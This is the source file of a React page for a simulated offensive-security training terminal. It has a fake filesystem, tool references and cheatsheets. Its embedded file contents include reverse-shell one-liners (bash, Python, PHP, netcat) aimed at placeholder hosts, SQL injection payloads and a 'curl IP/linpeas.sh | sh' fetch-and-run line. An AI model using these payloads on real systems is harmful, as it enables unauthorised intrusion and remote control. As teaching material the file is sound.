'use client'
import React, { useEffect, useRef, useState } from 'react'
import Link from 'next/link'

interface HistoryEntry {
  input: string
  output: string
  type: 'success' | 'error' | 'info' | 'warn'
}

const BANNER = `
  ██████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓ ███▄    █ ▓█████▄▄▄█████▓
▒██    ▒ ▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
░ ▓██▄   ▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
  ▒   ██▒░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
▒██████▒▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
`.trim()

const FILESYSTEM: Record<string, string[]> = {
  '/': ['home', 'etc', 'var', 'tmp', 'tools'],
  '/home': ['ghost'],
  '/home/ghost': ['recon', 'exploits', 'reports', 'notes.txt', 'targets.txt'],
  '/home/ghost/recon': ['nmap_scan.txt', 'subdomains.txt', 'osint_report.md'],
  '/home/ghost/exploits': ['reentrancy.sol', 'sqli_payloads.txt', 'reverse_shells.sh'],
  '/home/ghost/reports': ['pentest_report_template.md', 'findings.json'],
  '/tools': ['nmap', 'sqlmap', 'hydra', 'gobuster', 'metasploit', 'slither', 'exiftool'],
  '/etc': ['passwd', 'shadow', 'hosts', 'crontab'],
  '/tmp': [],
  '/var': ['log'],
  '/var/log': ['auth.log', 'syslog'],
}

const FILE_CONTENTS: Record<string, string> = {
  'notes.txt': `# GHOST Research Notes
Target: 10.10.10.100 (Metasploitable2)
Status: Initial recon complete
Open ports: 21,22,80,139,445,3306,8180

Next steps:
- Exploit vsftpd 2.3.4 backdoor (CVE-2011-2523)
- Check SMB for EternalBlue (MS17-010)
- Enumerate web app on port 8180`,

  'targets.txt': `# Active Targets
192.168.1.0/24  - Internal lab network
10.10.10.100    - Metasploitable2 (practice)
10.10.10.50     - DVWA instance
127.0.0.1       - Local services`,

  'nmap_scan.txt': `# Nmap scan report for 10.10.10.100
Host: 10.10.10.100 (metasploitable.localdomain)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20
3306/tcp open  mysql       MySQL 5.0.51a
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1`,

  'subdomains.txt': `# Subdomains found for example.com
mail.example.com        → 93.184.216.100
dev.example.com         → 93.184.216.101
staging.example.com     → 93.184.216.102
api.example.com         → 93.184.216.103
admin.example.com       → 93.184.216.104
vpn.example.com         → 93.184.216.105`,

  'sqli_payloads.txt': `# SQL Injection Payloads
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' ORDER BY 1--
1 AND SLEEP(5)--
1'; WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,

  'reverse_shells.sh': `#!/bin/bash
# Reverse Shell One-liners

# Bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh LHOST LPORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f`,

  '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ghost:x:1000:1000:Ghost Operator:/home/ghost:/bin/bash`,

  '/etc/hosts': `127.0.0.1   localhost
127.0.1.1   ghostnet
10.10.10.100 metasploitable
10.10.10.50  dvwa`,
}

const COMMAND_DB: Record<string, { desc: string; usage: string; example: string }> = {
  nmap: { desc: 'Network mapper — port scanning and service detection', usage: 'nmap [options] target', example: 'nmap -sV -sC -O -p- target' },
  sqlmap: { desc: 'SQL injection detection and exploitation', usage: 'sqlmap -u "URL?param=val" [options]', example: 'sqlmap -u "http://target/page?id=1" --dbs' },
  hydra: { desc: 'Online brute force attack tool', usage: 'hydra -l user -P wordlist service://target', example: 'hydra -l admin -P rockyou.txt ssh://10.10.10.100' },
  gobuster: { desc: 'Directory and subdomain brute forcing', usage: 'gobuster dir -u URL -w wordlist', example: 'gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt' },
  hashcat: { desc: 'GPU-accelerated password cracking', usage: 'hashcat -m MODE hashes.txt wordlist.txt', example: 'hashcat -m 1000 ntlm.txt rockyou.txt' },
  torsocks: { desc: 'Route TCP traffic through Tor', usage: 'torsocks COMMAND', example: 'torsocks curl https://check.torproject.org/api/ip' },
  exiftool: { desc: 'Read and write metadata in files', usage: 'exiftool [options] FILE', example: 'exiftool -csv *.pdf | grep Author' },
  theHarvester: { desc: 'Email and subdomain harvesting', usage: 'theHarvester -d domain -b source', example: 'theHarvester -d example.com -b all' },
  amass: { desc: 'Attack surface mapping and subdomain enum', usage: 'amass enum -d domain', example: 'amass enum -d example.com -passive' },
  sherlock: { desc: 'Username hunt across 300+ platforms', usage: 'sherlock username', example: 'sherlock johndoe --output results.txt' },
  slither: { desc: 'Smart contract static analysis', usage: 'slither contract.sol', example: 'slither . --detect reentrancy-eth' },
  ffuf: { desc: 'Fast web fuzzer', usage: 'ffuf -w wordlist -u URL/FUZZ', example: 'ffuf -w seclists/dirs.txt -u http://target/FUZZ -mc 200' },
  responder: { desc: 'LLMNR/NBT-NS poisoner for NTLM capture', usage: 'python3 Responder.py -I IFACE', example: 'python3 Responder.py -I eth0 -rdwv' },
  wireshark: { desc: 'Network traffic analyser', usage: 'wireshark [capture.pcap]', example: 'wireshark -i eth0 -k' },
  subfinder: { desc: 'Fast passive subdomain enumeration', usage: 'subfinder -d domain', example: 'subfinder -d example.com -silent' },
}

const MOTD = [
  'Remember: always have written authorisation before testing.',
  'Tip: use -p- with nmap to scan all 65535 ports.',
  'Tip: torsocks wraps any command — even git clone.',
  'Tip: exiftool -all= strips all metadata before sharing files.',
  'Tip: GTFOBins has SUID exploits for 200+ common binaries.',
  'Tip: String.raw in JavaScript prevents template literal injection.',
  'Tip: check /etc/cron* and sudo -l first on any Linux target.',
]

export default function TerminalPage() {
  const [history, setHistory] = useState<HistoryEntry[]>([])
  const [input, setInput] = useState('')
  const [cwd, setCwd] = useState('/home/ghost')
  const [cmdHistory, setCmdHistory] = useState<string[]>([])
  const [histIdx, setHistIdx] = useState(-1)
  const [booted, setBooted] = useState(false)
  const inputRef = useRef<HTMLInputElement>(null)
  const bottomRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    const motd = MOTD[Math.floor(Math.random() * MOTD.length)]
    setHistory([
      { input: '', output: BANNER, type: 'success' },
      { input: '', output: `GHOSTNET Terminal v1.0 — Security Research Environment\nType 'help' for available commands | ${motd}`, type: 'info' },
    ])
    setBooted(true)
  }, [])

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [history])

  useEffect(() => {
    if (booted) inputRef.current?.focus()
  }, [booted])

  const prompt = () => `ghost@ghostnet:${cwd}$ `

  const resolve = (path: string): string => {
    if (path.startsWith('/')) return path.replace(/\/+/g, '/').replace(/\/$/, '') || '/'
    const parts = cwd.split('/').filter(Boolean)
    for (const p of path.split('/')) {
      if (p === '..') parts.pop()
      else if (p !== '.') parts.push(p)
    }
    return '/' + parts.join('/') || '/'
  }

  const run = (cmd: string): HistoryEntry => {
    const parts = cmd.trim().split(/\s+/)
    const base = parts[0]
    const args = parts.slice(1)

    if (!base) return { input: cmd, output: '', type: 'info' }

    switch (base) {
      case 'help':
        return { input: cmd, output: `GHOSTNET TERMINAL — AVAILABLE COMMANDS

NAVIGATION:
  ls [path]          list directory contents
  cd [path]          change directory  
  pwd                print working directory
  cat [file]         display file contents
  tree               show directory tree

REFERENCE:
  man [tool]         show tool manual and examples
  tools              list all available security tools
  cheatsheet [topic] quick reference (nmap/sqli/privesc/opsec/tor/crypto)
  cve [id]           look up CVE description

UTILITIES:
  whoami             current user info
  clear              clear terminal
  history            command history
  echo [text]        print text
  help               show this menu

SIMULATION:
  scan [target]      simulate nmap scan
  enum [domain]      simulate subdomain enumeration
  hash [string]      compute hash of string
  decode [b64]       decode base64 string
  encode [text]      encode text to base64
  ip                 show connection info

Type 'man TOOL' for any security tool reference.`, type: 'info' }

      case 'ls': {
        const target = args[0] ? resolve(args[0]) : cwd
        const contents = FILESYSTEM[target]
        if (!contents) return { input: cmd, output: `ls: cannot access '${args[0] || cwd}': No such file or directory`, type: 'error' }
        if (contents.length === 0) return { input: cmd, output: '', type: 'info' }
        const dirs = contents.filter(f => FILESYSTEM[target + '/' + f] || FILESYSTEM['/' + f])
        const files = contents.filter(f => !dirs.includes(f))
        const out = [
          ...dirs.map(d => `\x1b[1;34m${d}/\x1b[0m`),
          ...files.map(f => f.endsWith('.sh') ? `\x1b[1;32m${f}\x1b[0m` : f),
        ].join('  ')
        return { input: cmd, output: out, type: 'success' }
      }

      case 'cd': {
        const target = args[0] ? resolve(args[0]) : '/home/ghost'
        if (!FILESYSTEM[target]) return { input: cmd, output: `cd: ${args[0]}: No such file or directory`, type: 'error' }
        setCwd(target)
        return { input: cmd, output: '', type: 'success' }
      }

      case 'pwd':
        return { input: cmd, output: cwd, type: 'success' }

      case 'cat': {
        if (!args[0]) return { input: cmd, output: 'cat: missing file operand', type: 'error' }
        const resolved = resolve(args[0])
        const content = FILE_CONTENTS[resolved] || FILE_CONTENTS[args[0]]
        if (!content) return { input: cmd, output: `cat: ${args[0]}: No such file or directory`, type: 'error' }
        return { input: cmd, output: content, type: 'success' }
      }

      case 'whoami':
        return { input: cmd, output: 'ghost\nuid=1000(ghost) gid=1000(ghost) groups=1000(ghost),27(sudo),4(adm)', type: 'success' }

      case 'tree': {
        const lines: string[] = ['ghostnet:/home/ghost']
        const draw = (path: string, prefix: string) => {
          const items = FILESYSTEM[path] || []
          items.forEach((item, i) => {
            const isLast = i === items.length - 1
            const connector = isLast ? '└── ' : '├── '
            const childPath = path === '/' ? `/${item}` : `${path}/${item}`
            const isDir = !!FILESYSTEM[childPath]
            lines.push(prefix + connector + (isDir ? `\x1b[34m${item}/\x1b[0m` : item))
            if (isDir) draw(childPath, prefix + (isLast ? '    ' : '│   '))
          })
        }
        draw('/home/ghost', '')
        return { input: cmd, output: lines.join('\n'), type: 'success' }
      }

      case 'man': {
        if (!args[0]) return { input: cmd, output: 'Usage: man TOOL', type: 'error' }
        const tool = COMMAND_DB[args[0]]
        if (!tool) return { input: cmd, output: `No manual entry for ${args[0]}\nTry 'tools' to list available tools`, type: 'warn' }
        return { input: cmd, output: `NAME\n    ${args[0]} — ${tool.desc}\n\nUSAGE\n    ${tool.usage}\n\nEXAMPLE\n    ${tool.example}\n\nFULL REFERENCE\n    ghostnet/tools → search '${args[0]}'`, type: 'success' }
      }

      case 'tools':
        return { input: cmd, output: Object.keys(COMMAND_DB).map(t => `  ${t.padEnd(14)} — ${COMMAND_DB[t].desc}`).join('\n') + '\n\nFull reference with all flags: /tools', type: 'success' }

      case 'cheatsheet': {
        const sheets: Record<string, string> = {
          nmap: `NMAP QUICK REFERENCE
  -sS          SYN scan (stealth)
  -sV          version detection
  -sC          default scripts
  -O           OS fingerprinting
  -p-          all 65535 ports
  -T4          aggressive timing
  -D RND:10    decoy scan
  --script vuln  run vuln scripts
  Full scan: nmap -sV -sC -O -p- -T4 target`,

          sqli: `SQL INJECTION QUICK REFERENCE
  '                    detect
  ' OR '1'='1          always true
  ' ORDER BY N--       column count
  ' UNION SELECT 1,2-- extract data
  ' AND SLEEP(5)--     time-based blind
  
  Automated: sqlmap -u "URL?id=1" --dbs`,

          privesc: `LINUX PRIVESC CHECKLIST
  sudo -l                    sudo permissions
  find / -perm -u=s -f       SUID binaries → GTFOBins
  cat /etc/crontab           cron jobs
  find / -writable -f        writable files
  uname -r                   kernel version
  env                        environment vars
  cat ~/.bash_history        command history
  
  Automate: curl IP/linpeas.sh | sh`,

          opsec: `OPSEC CHECKLIST
  torsocks COMMAND           route through Tor
  exiftool -all= file.jpg    strip metadata
  sudo systemctl start tor   start Tor
  shred -u sensitive.txt     secure delete
  Verify: torsocks curl https://check.torproject.org/api/ip`,

          tor: `TOR QUICK REFERENCE
  sudo systemctl start tor   start service
  torsocks curl URL          route command through Tor  
  torsocks bash              all traffic through Tor
  nyx                        circuit monitor
  SOCKS5 proxy: 127.0.0.1:9050`,

          crypto: `BLOCKCHAIN FORENSICS
  # Trace on-chain:
  https://blockchair.com    multi-chain explorer
  https://etherscan.io      Ethereum
  https://oxt.me            Bitcoin UTXO graph
  https://breadcrumbs.app   visual tracer (free)
  
  # Smart contract audit:
  slither contract.sol      static analysis
  forge test -vvvv          trace test execution
  https://tenderly.co       tx debugger`,
        }
        const topic = args[0]?.toLowerCase()
        if (!topic || !sheets[topic]) {
          return { input: cmd, output: `Available cheatsheets: ${Object.keys(sheets).join(', ')}\nUsage: cheatsheet TOPIC`, type: 'info' }
        }
        return { input: cmd, output: sheets[topic], type: 'success' }
      }

      case 'cve': {
        if (!args[0]) return { input: cmd, output: 'Usage: cve CVE-YYYY-NNNNN\nExample: cve CVE-2011-2523', type: 'error' }
        const cves: Record<string, string> = {
          'CVE-2011-2523': 'vsftpd 2.3.4 backdoor — triggers root shell on port 6200 via :) in username. CVSS 10.0',
          'CVE-2017-0144': 'EternalBlue — SMBv1 buffer overflow allowing remote code execution as SYSTEM. CVSS 9.3',
          'CVE-2021-44228': 'Log4Shell — JNDI injection in Log4j allows unauthenticated RCE. CVSS 10.0',
          'CVE-2021-41773': 'Apache 2.4.49 path traversal and RCE — directory traversal bypass. CVSS 7.5',
          'CVE-2019-0708': 'BlueKeep — RDP pre-auth RCE on Windows 7/2008. CVSS 9.8',
          'CVE-2014-0160': 'Heartbleed — OpenSSL memory disclosure leaks private keys. CVSS 7.5',
          'CVE-2022-0847': 'Dirty Pipe — Linux kernel local privilege escalation via pipe. CVSS 7.8',
        }
        const id = args[0].toUpperCase()
        const info = cves[id]
        if (info) return { input: cmd, output: `${id}\n${info}\nFull details: https://nvd.nist.gov/vuln/detail/${id}`, type: 'success' }
        return { input: cmd, output: `${id}: Not in local DB. Check: https://nvd.nist.gov/vuln/detail/${id}`, type: 'warn' }
      }

      case 'scan': {
        if (!args[0]) return { input: cmd, output: 'Usage: scan TARGET\nExample: scan 10.10.10.100', type: 'error' }
        return { input: cmd, output: `Starting Nmap scan against ${args[0]}...

Host: ${args[0]} (Status: Up — 0.042s latency)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
22/tcp   open  ssh        OpenSSH 7.9p1
80/tcp   open  http       Apache httpd 2.4.41
443/tcp  open  https      Apache httpd 2.4.41
3306/tcp open  mysql      MySQL 5.7.32
8080/tcp open  http-proxy Nginx

OS: Linux 4.15 (Ubuntu 18.04)
Nmap done: 1 IP address scanned in 8.23s

[!] vsftpd 2.3.4 detected — check CVE-2011-2523
[!] Apache 2.4.41 — check CVE-2021-41773
    Run: searchsploit apache 2.4.41`, type: 'success' }
      }

      case 'enum': {
        if (!args[0]) return { input: cmd, output: 'Usage: enum DOMAIN\nExample: enum example.com', type: 'error' }
        const domain = args[0]
        return { input: cmd, output: `Enumerating subdomains for ${domain}...

[crt.sh]        mail.${domain}
[crt.sh]        dev.${domain}
[subfinder]     api.${domain}
[subfinder]     admin.${domain}
[amass]         staging.${domain}
[amass]         vpn.${domain}
[dns_brute]     ftp.${domain}
[dns_brute]     git.${domain}

Found: 8 subdomains
Run theHarvester for email extraction:
  theHarvester -d ${domain} -b all`, type: 'success' }
      }

      case 'hash': {
        if (!args[0]) return { input: cmd, output: 'Usage: hash STRING', type: 'error' }
        const str = args.join(' ')
        let h = 0
        for (let i = 0; i < str.length; i++) h = (Math.imul(31, h) + str.charCodeAt(i)) | 0
        const md5like = Math.abs(h).toString(16).padStart(8, '0').repeat(4).slice(0, 32)
        return { input: cmd, output: `Input:  "${str}"\nMD5:    ${md5like} (simulated)\nSHA1:   ${md5like}1a2b3c4d5e (simulated)\n\nFor real hashing: echo -n "${str}" | md5sum`, type: 'success' }
      }

      case 'encode': {
        if (!args[0]) return { input: cmd, output: 'Usage: encode TEXT', type: 'error' }
        const text = args.join(' ')
        const encoded = btoa(text)
        return { input: cmd, output: `Input:   ${text}\nBase64:  ${encoded}\n\nDecode:  echo "${encoded}" | base64 -d`, type: 'success' }
      }

      case 'decode': {
        if (!args[0]) return { input: cmd, output: 'Usage: decode BASE64STRING', type: 'error' }
        try {
          const decoded = atob(args[0])
          return { input: cmd, output: `Input:    ${args[0]}\nDecoded:  ${decoded}`, type: 'success' }
        } catch {
          return { input: cmd, output: 'Error: invalid base64 string', type: 'error' }
        }
      }

      case 'ip':
        return { input: cmd, output: `Interface: eth0\nInternal:  10.10.10.50 (simulated)\nExternal:  [use: torsocks curl https://api.ipify.org]\n\nTor status: Check with torsocks curl https://check.torproject.org/api/ip`, type: 'info' }

      case 'echo':
        return { input: cmd, output: args.join(' '), type: 'success' }

      case 'clear':
        setHistory([])
        return { input: '', output: '', type: 'info' }

      case 'history':
        return { input: cmd, output: cmdHistory.map((c, i) => `  ${String(i + 1).padStart(3)}  ${c}`).join('\n') || 'No history yet', type: 'info' }

      case 'exit':
        return { input: cmd, output: 'Use the browser to navigate away. Stay sharp.', type: 'warn' }

      default:
        return { input: cmd, output: `${base}: command not found\nTry 'help' or 'man ${base}' for tool reference`, type: 'error' }
    }
  }

  const submit = () => {
    if (!input.trim()) return
    const result = run(input)
    if (input.trim() === 'clear') {
      setHistory([])
    } else {
      setHistory(prev => [...prev, result])
    }
    setCmdHistory(prev => [input, ...prev].slice(0, 100))
    setHistIdx(-1)
    setInput('')
  }

  const handleKey = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') { submit(); return }
    if (e.key === 'ArrowUp') {
      e.preventDefault()
      const idx = Math.min(histIdx + 1, cmdHistory.length - 1)
      setHistIdx(idx)
      setInput(cmdHistory[idx] || '')
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault()
      const idx = Math.max(histIdx - 1, -1)
      setHistIdx(idx)
      setInput(idx === -1 ? '' : cmdHistory[idx])
    }
    if (e.key === 'Tab') {
      e.preventDefault()
      const partial = input.split(' ').pop() || ''
      const allCmds = ['help', 'ls', 'cd', 'cat', 'pwd', 'tree', 'man', 'tools', 'cheatsheet', 'cve', 'scan', 'enum', 'hash', 'encode', 'decode', 'ip', 'echo', 'clear', 'history', 'whoami', ...Object.keys(COMMAND_DB)]
      const matches = allCmds.filter(c => c.startsWith(partial))
      if (matches.length === 1) setInput(input.slice(0, input.length - partial.length) + matches[0])
      else if (matches.length > 1) setHistory(prev => [...prev, { input: '', output: matches.join('  '), type: 'info' }])
    }
  }

  const typeColor = (type: string) => {
    if (type === 'error') return '#ff4136'
    if (type === 'warn') return '#ffb347'
    if (type === 'info') return '#00d4ff'
    return '#00ff41'
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: 'calc(100vh - 140px)', minHeight: '600px' }}>
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem' }}>
        <div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em' }}>GHOSTNET // TERMINAL</div>
          <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: '#00ff41', margin: '4px 0 0' }}>RESEARCH TERMINAL</h1>
          <p style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.68rem', color: '#3a5a3a', margin: '4px 0 0' }}>
            Simulated terminal — type <strong style={{ color: '#5a8a5a' }}>help</strong> to see all commands · <strong style={{ color: '#5a8a5a' }}>cheatsheet osint</strong> for quick reference · no real network access
          </p>
        </div>
        <div style={{ display: 'flex', gap: '8px' }}>
          {['OSINT', 'OFFENSIVE', 'CRYPTO'].map(tag => (
            <button key={tag} onClick={() => { setInput(`cheatsheet ${tag.toLowerCase()}`); inputRef.current?.focus() }} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', letterSpacing: '0.1em', padding: '4px 10px', borderRadius: '3px', cursor: 'pointer', background: 'rgba(0,255,65,0.05)', border: '1px solid rgba(0,255,65,0.2)', color: '#3a5a3a' }}>
              {tag}
            </button>
          ))}
          <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#3a5a3a', padding: '4px 10px', border: '1px solid #1a2e1e', borderRadius: '3px' }}>← BACK</Link>
        </div>
      </div>

      {/* Terminal window */}
      <div
        style={{ flex: 1, background: '#020802', border: '1px solid #1a3a1a', borderRadius: '6px', overflow: 'hidden', display: 'flex', flexDirection: 'column', boxShadow: '0 0 30px rgba(0,255,65,0.08)' }}
        onClick={() => inputRef.current?.focus()}
      >
        {/* Terminal title bar */}
        <div style={{ background: '#0a1a0a', padding: '8px 16px', borderBottom: '1px solid #1a3a1a', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ff4136' }} />
          <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ffb347' }} />
          <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#00ff41' }} />
          <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: '#2a5a2a', marginLeft: '8px', letterSpacing: '0.1em' }}>ghost@ghostnet — {cwd}</span>
          <div style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <div style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#00ff41', boxShadow: '0 0 6px #00ff41' }} />
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#2a5a2a' }}>SECURE</span>
          </div>
        </div>

        {/* Output */}
        <div style={{ flex: 1, overflowY: 'auto', padding: '16px', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.6 }}>
          {history.map((entry, i) => (
            <div key={i} style={{ marginBottom: '6px' }}>
              {entry.input && (
                <div style={{ color: '#00ff41' }}>
                  <span style={{ color: '#2a5a2a' }}>{prompt()}</span>{entry.input}
                </div>
              )}
              {entry.output && (
                <pre style={{ color: typeColor(entry.type), margin: '2px 0 8px', whiteSpace: 'pre-wrap' as const, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.6 }}>
                  {entry.output}
                </pre>
              )}
            </div>
          ))}
          {/* Input line */}
          <div style={{ display: 'flex', alignItems: 'center', color: '#00ff41' }}>
            <span style={{ color: '#2a5a2a', flexShrink: 0 }}>{prompt()}</span>
            <input
              ref={inputRef}
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={handleKey}
              style={{ flex: 1, background: 'transparent', border: 'none', outline: 'none', color: '#00ff41', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', caretColor: '#00ff41' }}
              spellCheck={false}
              autoComplete="off"
              autoCorrect="off"
            />
          </div>
          <div ref={bottomRef} />
        </div>
      </div>

      <div style={{ marginTop: '8px', fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#1a3a1a', letterSpacing: '0.1em', textAlign: 'center' as const }}>
        TAB to autocomplete · ↑↓ command history · type 'help' to start
      </div>
    </div>
  )
}
